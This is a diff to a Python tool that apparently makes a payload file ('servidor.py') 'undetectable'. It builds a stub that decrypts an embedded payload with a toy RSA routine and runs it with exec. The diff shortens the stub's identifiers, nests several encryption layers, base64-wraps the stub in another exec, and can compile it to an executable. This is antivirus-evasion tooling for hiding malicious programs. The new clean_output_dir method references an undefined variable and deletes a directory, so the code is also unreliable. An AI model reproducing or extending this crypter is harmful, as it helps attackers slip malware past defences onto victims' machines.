@@ -213,6 +213,10 @@ class StartModule():
 		else:
 			return arg
 
+	def clean_output_dir(self):
+		output_dir = os.path.abspath(os.path.join(os.path.dirname(stub_name), 'output'))
+		shutil.rmtree(output_dir)
+
 	def saveStub(self, stub, save_name, print_save_stub=True):
 		# Save the Stub
 		stub_name = save_name
@@ -222,60 +226,64 @@ class StartModule():
 		if print_save_stub:
 			print('Stub saved as {file}'.format(file=stub_name))
 
-	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, convert=False):
+	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, is_iterating=False, is_last=False, convert=False):
 		# Create Stub in Python File
-		stub = "import argparse\nimport math\nfrom random import randint\nimport base64\nimport binascii\nimport random\n"
-		stub += "crypto_data_hex = \"" + crypto_data_hex + "\"\n"
-		stub += "public_key = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
-		stub += "drop_file_name = \"" + drop_file_name + "\"\n"
-		stub += """
-# Decrypt
-def decrypt(public_key, ciphertext):
-	#Unpack the key into its components
-	key, n = public_key
-	mensajeRecibido = __recibirBase64__(ciphertext.encode('utf-8'))
-	mensajeHexRecibido = __Base64_Hex__(mensajeRecibido)
-	mensajeDecimalRecibido = __Hex_decimal__(mensajeHexRecibido)
-	mensajeDescifrado = [((char ** key) % n) for char in mensajeDecimalRecibido]
-	mensaje_de_ascii = __decimal_ASCII__(mensajeDescifrado)
-	return ''.join(mensaje_de_ascii)
-def __recibirBase64__(mensaje):
-	msg_base64 = []
-	for i in range(0,len(mensaje), 4):
-		msg_base64.append(mensaje[i:i+4])
-	return msg_base64
-def __Base64_Hex__(mensaje):
-	mensajeHex = []
-	for b64 in mensaje:
-		mensajeHex.append(base64.b64decode(b64))
-	return mensajeHex
-def __Hex_decimal__(mensaje):
-	mensajeDecimal = []
-	for hexa in mensaje:
-		hexa = hexa.decode("UTF-8")
-		numero = int(hexa, 16)
-		mensajeDecimal.append(numero)    
-	return mensajeDecimal
-def __decimal_ASCII__(mensaje):
-	mensaje1 = ""
-	for decimal in mensaje:
-		mensaje1 = mensaje1 + chr(decimal)
-	return mensaje1
-decrypt_data = decrypt(public_key=public_key, ciphertext=crypto_data_hex)
-# Save file
-new_file = open(drop_file_name, 'wb')
-new_file.write(decrypt_data.encode('utf-8'))
-new_file.close()
-# Execute file
-import subprocess
-proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		stub = ''
+		if is_last:
+			stub = "import argparse, math, base64, binascii, random\nfrom random import randint\n"
+			stub += "cdx = \"" + crypto_data_hex + "\"\n"
+			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
+			stub += """
+def dcy(pk, cptx):
+	k, n = pk
+	mr = __reBa64__(cptx.encode('utf-8'))
+	mhr = __ba64Hex__(mr)
+	mdr = __hexDec__(mhr)
+	md = [((c ** k) % n) for c in mdr]
+	ma = __deAS__(md)
+	return ''.join(ma)
+def __reBa64__(m):
+	mBa64 = []
+	for i in range(0,len(m), 4):
+		mBa64.append(m[i:i+4])
+	return mBa64
+def __ba64Hex__(m):
+	mHx = []
+	for b64 in m:
+		mHx.append(base64.b64decode(b64))
+	return mHx
+def __hexDec__(m):
+	mDec = []
+	for hx in m:
+		hx = hx.decode("UTF-8")
+		n = int(hx, 16)
+		mDec.append(n)    
+	return mDec
+def __deAS__(m):
+	m1 = ""
+	for d in m:
+		m1 = m1 + chr(d)
+	return m1
+dcy_data = dcy(pk=pk, cptx=cdx)
 """
+		if is_iterating:
+			stub = "cdx = \"" + crypto_data_hex + "\"\n"
+			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
+			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\nexec(dcy_data.encode('utf-8'))"
+		else:
+			stub += "exec(dcy_data)"
+
+		stub_base64 = base64.b64encode(stub.encode('utf-8'))
+		stub = "import base64\n"
+		stub += "data = {st_ba64}\n".format(st_ba64=stub_base64)
+		stub += "exec(base64.b64decode(data))"
+		
 		self.saveStub(stub, save_name, print_save_stub)
 
 		if convert:
 			self.convertToExe(save_name)
 
-	def crypt_file(self, filename, new_file_name, drop_file_name, iterate_count=1, print_save_stub=True, compile_exe=False):
+	def crypt_file(self, filename, new_file_name, drop_file_name, is_iterating=False, iterate_count=1, is_last=False, print_save_stub=True, compile_exe=False):
 		"""
 		filename es el archivo original a indetectar (filename='servidor.py')
 		new_file_name es el nombre final del fichero indetectado (new_file_name='indetectable.py')
@@ -283,11 +291,14 @@ proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), she
 		compile_exe es si queremos compilarlo con pyinstaller
 		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
+		self.clean_output_dir()
 		temp_filename = filename
 		if iterate_count > 1:
 			temp_filename = filename
 			for i in range(1, iterate_count):
-				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, iterate_count=1, print_save_stub=False, compile_exe=False)
+				if i == iterate_count - 1:
+					is_last = True
+				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, is_iterating=True, iterate_count=1, is_last=is_last, print_save_stub=False, compile_exe=False)
 		
 		filename = temp_filename
 		if filename and new_file_name:
@@ -298,11 +309,12 @@ proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), she
 			new_file = new_file_name
 			if not '.' in new_file:
 				new_file = '{file}.py'.format(file=new_file)
+
 			if compile_exe:
-				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, convert=True)
+				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last, convert=True)
 				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
 			else:
-				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub)
+				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last)
 			return new_file
 		else:
 			return None
